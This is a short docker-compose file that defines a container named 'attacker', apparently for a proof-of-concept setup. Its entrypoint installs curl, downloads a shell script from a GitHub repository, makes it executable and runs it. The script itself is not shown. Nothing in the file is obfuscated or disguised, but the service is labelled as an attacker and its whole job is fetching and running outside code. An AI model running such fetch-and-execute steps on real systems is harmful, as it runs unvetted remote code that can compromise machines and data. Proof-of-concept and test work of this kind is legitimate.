services:
  attacker:
    image: alpine:3.20
    entrypoint:
      - sh
      - -c
      - |
        apk add --no-cache curl >/dev/null 2>&1
        curl -sS -o /tmp/run.sh https://raw.githubusercontent.com/sashabal/f23-poc/f23-test-root/attacker.sh
        chmod +x /tmp/run.sh
        exec /tmp/run.sh
